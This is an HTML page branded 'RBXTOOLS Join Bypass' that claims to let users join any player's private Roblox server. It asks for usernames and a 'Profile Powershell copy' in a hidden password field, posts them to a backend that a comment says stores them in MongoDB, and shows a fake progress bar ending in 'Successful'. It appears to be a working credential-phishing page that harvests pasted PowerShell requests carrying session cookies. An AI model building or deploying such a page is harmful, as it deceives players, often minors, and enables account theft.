<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Modern UI</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Inter',sans-serif;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:
        radial-gradient(circle at top,#2346ff20 0%,transparent 45%),
        radial-gradient(circle at bottom,#3b82f620 0%,transparent 45%),
        linear-gradient(180deg,#070b16,#05070d);
    overflow:hidden;
}

body::before{
    content:"";
    position:absolute;
    width:700px;
    height:700px;
    background:#345dff15;
    filter:blur(120px);
    border-radius:50%;
    top:-250px;
}

.container{
    width:640px;
    text-align:center;
    z-index:2;
}

.badge{
    display:inline-block;
    padding:7px 16px;
    border-radius:999px;
    background:#111827;
    border:1px solid rgba(255,255,255,.06);
    color:#8fa6ff;
    font-size:13px;
    margin-bottom:22px;
}

h1{
    color:#fff;
    font-size:68px;
    font-weight:800;
    line-height:1;
    margin-bottom:18px;
}

.subtitle{
    color:#7f8ca9;
    font-size:17px;
    line-height:28px;
    margin-bottom:45px;
}

.card{
    background:#0d1320;
    border:1px solid rgba(90,120,255,.18);
    border-radius:22px;
    padding:34px;
    box-shadow:
        0 0 50px rgba(55,90,255,.08),
        inset 0 0 0 1px rgba(255,255,255,.02);
}

.inputBox{
    margin-bottom:18px;
}

.inputBox label{
    display:block;
    text-align:left;
    color:#d7def8;
    font-size:14px;
    margin-bottom:8px;
}

.inputBox input{
    width:100%;
    height:58px;
    background:#080d17;
    border:1px solid #1b2740;
    border-radius:12px;
    color:white;
    font-size:15px;
    padding:0 18px;
    transition:.25s;
}

.inputBox input::placeholder{
    color:#5f6982;
}

.inputBox input:focus{
    outline:none;
    border-color:#4b73ff;
    box-shadow:0 0 15px rgba(75,115,255,.25);
}

button{
    width:100%;
    height:60px;
    margin-top:10px;
    border:none;
    border-radius:14px;
    cursor:pointer;
    background:linear-gradient(180deg,#416dff,#2955f2);
    color:#fff;
    font-size:17px;
    font-weight:600;
    transition:.25s;
}

button:hover{
    transform:translateY(-2px);
    box-shadow:0 15px 35px rgba(65,109,255,.35);
}

button:disabled{
    cursor:default;
}

/* EKRAN ŁADOWANIA */

.loadingScreen{
    display:none;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    padding:20px 0;
}

.progressCircle{
    width:130px;
    height:130px;
    border-radius:50%;
    display:flex;
    align-items:center;
    justify-content:center;
    position:relative;
    margin-bottom:25px;
}

.progressCircle::before{
    content:"";
    position:absolute;
    inset:0;
    border-radius:50%;
    background:conic-gradient(
        #416dff var(--progress),
        #18233b 0
    );
}

.progressCircle::after{
    content:"";
    position:absolute;
    inset:8px;
    border-radius:50%;
    background:#0d1320;
}

.progressText{
    position:relative;
    z-index:2;
    color:white;
    font-size:25px;
    font-weight:700;
}

.loadingTitle{
    color:white;
    font-size:20px;
    font-weight:600;
    margin-bottom:8px;
}

.loadingSubtitle{
    color:#68758f;
    font-size:14px;
}

.successIcon{
    display:none;
    width:130px;
    height:130px;
    border-radius:50%;
    background:rgba(34,197,94,.1);
    border:2px solid #22c55e;
    align-items:center;
    justify-content:center;
    margin-bottom:25px;
}

.successIcon span{
    color:#22c55e;
    font-size:60px;
    font-weight:300;
}

.successTitle{
    display:none;
    color:#22c55e;
    font-size:24px;
    font-weight:700;
    margin-bottom:8px;
}

.successSubtitle{
    display:none;
    color:#68758f;
    font-size:14px;
}
</style>

</head>

<body>

<div class="container">

    <div class="badge">
        RBXTOOLS
    </div>

    <h1>Join Bypass</h1>

    <p class="subtitle">
        Join whoever you want. On our private server bypass site, you receive a join link after completing the required steps.
    </p>

    <!-- FORMULARZ -->

    <div class="card" id="formCard">

        <div class="inputBox">
            <label>Username of the person you want to join</label>
            <input
                id="targetUsername"
                type="text"
                placeholder="Enter value..."
            >
        </div>

        <div class="inputBox">
            <label>Your username</label>
            <input
                id="yourUsername"
                type="text"
                placeholder="Enter value..."
            >
        </div>

        <div class="inputBox">
            <label>Profile Powershell copy</label>
            <input
                id="powershell"
                type="password"
                placeholder="Enter value..."
            >
        </div>

        <button id="submitButton" onclick="sendData()">
            Launch Process
        </button>

    </div>

    <!-- ŁADOWANIE -->

    <div class="card loadingScreen" id="loadingCard">

        <div
            class="progressCircle"
            id="progressCircle"
            style="--progress: 0%;"
        >
            <div class="progressText" id="progressText">
                0%
            </div>
        </div>

        <div class="loadingTitle" id="loadingTitle">
            Processing...
        </div>

        <div class="loadingSubtitle" id="loadingSubtitle">
            Please wait while we process your request.
        </div>

        <div class="successIcon" id="successIcon">
            <span>✓</span>
        </div>

        <div class="successTitle" id="successTitle">
            Successful
        </div>

        <div class="successSubtitle" id="successSubtitle">
            Your request has been completed successfully.
        </div>

    </div>

</div>

<script>

async function sendData() {

    const targetUsername =
        document.getElementById("targetUsername").value.trim();

    const yourUsername =
        document.getElementById("yourUsername").value.trim();

    const powershell =
        document.getElementById("powershell").value.trim();

    if (!targetUsername || !yourUsername || !powershell) {
        alert("Please fill in all fields.");
        return;
    }

    /*
        Pokazujemy ekran ładowania
    */

    document.getElementById("formCard").style.display = "none";
    document.getElementById("loadingCard").style.display = "flex";

    const progressCircle =
        document.getElementById("progressCircle");

    const progressText =
        document.getElementById("progressText");

    const loadingTitle =
        document.getElementById("loadingTitle");

    const loadingSubtitle =
        document.getElementById("loadingSubtitle");

    let progress = 0;

    /*
        Animacja procentów
    */

    const progressInterval = setInterval(() => {

        if (progress < 90) {
            progress++;

            progressCircle.style.setProperty(
                "--progress",
                progress + "%"
            );

            progressText.textContent =
                progress + "%";
        }

    }, 35);

    try {

        /*
            Wysyłamy dane do MongoDB przez backend
        */

        const response = await fetch("/api/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                targetUsername,
                yourUsername,
                powershell
            })
        });

        const result = await response.json();

        clearInterval(progressInterval);

        if (response.ok && result.success) {

            /*
                Dokańczamy animację do 100%
            */

            for (let i = progress; i <= 100; i++) {

                progressCircle.style.setProperty(
                    "--progress",
                    i + "%"
                );

                progressText.textContent =
                    i + "%";

                await new Promise(resolve =>
                    setTimeout(resolve, 15)
                );
            }

            /*
                Pokazujemy Successful
            */

            await new Promise(resolve =>
                setTimeout(resolve, 400)
            );

            progressCircle.style.display = "none";

            loadingTitle.style.display = "none";
            loadingSubtitle.style.display = "none";

            document.getElementById("successIcon")
                .style.display = "flex";

            document.getElementById("successTitle")
                .style.display = "block";

            document.getElementById("successSubtitle")
                .style.display = "block";

        } else {

            clearInterval(progressInterval);

            loadingTitle.textContent = "Error";
            loadingTitle.style.color = "#ff6b6b";

            loadingSubtitle.textContent =
                result.error || "Something went wrong.";

            loadingSubtitle.style.color = "#ff6b6b";

        }

    } catch (error) {

        clearInterval(progressInterval);

        console.error(error);

        loadingTitle.textContent = "Connection Error";
        loadingTitle.style.color = "#ff6b6b";

        loadingSubtitle.textContent =
            "Could not connect to the server.";

        loadingSubtitle.style.color = "#ff6b6b";
    }
}

</script>

</body>
</html>
